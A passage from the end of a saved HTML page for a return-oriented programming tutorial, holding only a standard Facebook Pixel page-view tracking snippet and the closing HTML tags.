ROP - Ropping your way to # (Part 1)_files/t.js.下載"></script> </div>
<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","657537318161329");fbq("track","PageView");</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=657537318161329&amp;ev=PageView&amp;noscript=1"></noscript>

</body></html>